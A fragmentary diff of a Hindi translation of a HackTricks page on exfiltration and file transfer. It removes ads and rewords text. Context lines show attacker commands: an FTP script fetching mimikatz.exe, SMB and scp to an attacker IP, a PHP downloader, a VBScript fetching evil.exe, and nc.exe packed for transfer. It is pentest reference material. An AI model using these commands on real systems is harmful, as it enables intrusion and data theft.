@@ -4,29 +4,21 @@
 
 <summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>
 
-HackTricks का समर्थन करने के अन्य तरीके:
+दूसरे तरीके HackTricks का समर्थन करने के लिए:
 
-* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
-* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
-* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **हमें** **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
-* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।
+* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
+* [**आधिकारिक PEASS & HackTricks swag प्राप्त करें**](https://peass.creator-spring.com)
+* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
+* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
+* **हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+## सामान्य रूप से सफेद सूचीबद्ध डोमेन जानकारी निकालने के लिए
 
-वे सबसे महत्वपूर्ण भेदभाविता को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, APIs से वेब ऐप्स और क्लाउड सिस्टम जैसे आपके पूरे टेक स्टैक में मुद्दे खोजता है। [**आज ही मुफ्त में इसे ट्राय करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।
+[https://lots-project.com/](https://lots-project.com/) जांचें कि कौन से सामान्य रूप से सफेद सूचीबद्ध डोमेन दुरुपयोग किए जा सकते हैं
 
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-## सूचीबद्ध डोमेन्स जिनसे सूचना निकाली जा सकती है
-
-[https://lots-project.com/](https://lots-project.com/) पर जांच करें कि कौन से सामान्य व्हाइटलिस्टेड डोमेन्स का दुरुपयोग किया जा सकता है
-
-## कॉपी और पेस्ट बेस64
+## कॉपी एंड पेस्ट बेस64
 
 **Linux**
 ```bash
@@ -161,14 +153,6 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-सबसे महत्वपूर्ण सुरक्षा गड़बड़ियों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, API से वेब ऐप्स और क्लाउड सिस्टम जैसे आपके पूरे टेक स्टैक पर मुद्दे खोजता है। [**अभी मुफ्त में आज़माएं**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks)।
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## SMB
 
 काली के रूप में सर्वर
@@ -197,14 +181,15 @@ service smbd restart
 
 Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
 
-1. **Email**: Sending data as email attachments.
-2. **FTP**: Transferring data using File Transfer Protocol.
-3. **DNS**: Encoding data in DNS requests.
-4. **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols.
-5. **Steganography**: Hiding data within other files or images.
-6. **Cloud Storage**: Uploading data to cloud storage services.
+1. **Compression**: Compressing data before exfiltration can help evade detection.
+2. **Encryption**: Encrypting data ensures that even if the exfiltrated data is intercepted, it remains secure.
+3. **Steganography**: Hiding data within other files or images can be a covert way to exfiltrate information.
+4. **DNS Tunneling**: Using DNS requests to tunnel data out of a network is a common exfiltration technique.
+5. **Exfiltration Over Alternative Protocols**: Utilizing protocols other than HTTP/HTTPS for exfiltration can bypass network controls.
+6. **Data Exfiltration via Cloud Services**: Uploading data to cloud storage services can be a stealthy way to exfiltrate information.
+7. **Using External Devices**: USB drives or external hard drives can be used to physically exfiltrate data from a system.
 
-It is essential for hackers to choose the exfiltration method carefully to avoid detection and successfully transfer the stolen data.
+By understanding these exfiltration methods, security professionals can better protect their systems from data breaches.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -220,7 +205,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित से हमलावर तक एक निर्देशिका माउंट कर सकता है।
+यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित से हमलावर की ओर से एक निर्देशिका माउंट कर सकता है।
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -273,7 +258,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इंस्टॉलेशन के दौरान व्यक्तिगत रूप से जोड़ना चाहिए)
+डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इंस्टॉलेशन के दौरान विशेष रूप से जोड़ना चाहिए)
 
 काली में, **TFTP सर्वर शुरू करें**:
 ```bash
@@ -299,7 +284,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-VBScript एक प्रोग्रामिंग भाषा है जो Microsoft Windows सिस्टम्स पर चलने के लिए डिज़ाइन की गई है। VBScript का उपयोग विभिन्न कार्यों को स्क्रिप्ट करने के लिए किया जाता है, जिसमें डेटा एक्सफ़िल्ट्रेशन भी शामिल है।
+वीबीस्क्रिप्ट
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -335,9 +320,9 @@ echo ts.Close >> wget.vbs
 ```bash
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
-## डीबग.exe
+## डीबग.एक्सई
 
-`डीबग.exe` प्रोग्राम न केवल बाइनरी की जांच की अनुमति देता है बल्कि **हेक्स से उन्हें पुनः निर्माण करने की क्षमता भी है**। इसका मतलब है कि एक बाइनरी के हेक्स प्रदान करके, `डीबग.exe` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालांकि, यह महत्वपूर्ण है कि `डीबग.exe` का एक **सीमितांकन 64 किलोबाइट तक की फ़ाइलों को एसेम्बल करने की सीमा है**।
+`डीबग.एक्सई` प्रोग्राम न केवल बाइनरी की जांच की अनुमति देता है बल्कि **हेक्स से उन्हें पुनः निर्माण करने की क्षमता भी है**। इसका मतलब है कि एक बाइनरी के हेक्स प्रदान करके, `डीबग.एक्सई` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालांकि, यह महत्वपूर्ण है कि डीबग.एक्सई का एक **सीमितांकन है जो 64 केबी बाइट तक की फ़ाइलों को एसेम्बल कर सकता है**।
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -347,4 +332,16 @@ wine exe2bat.exe nc.exe nc.txt
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+<details>
+
+<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+दूसरे तरीके HackTricks का समर्थन करने के लिए:
+
+* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
+* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
+* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
+* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** को** **फॉलो** करें।
+* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।
+
+</details>
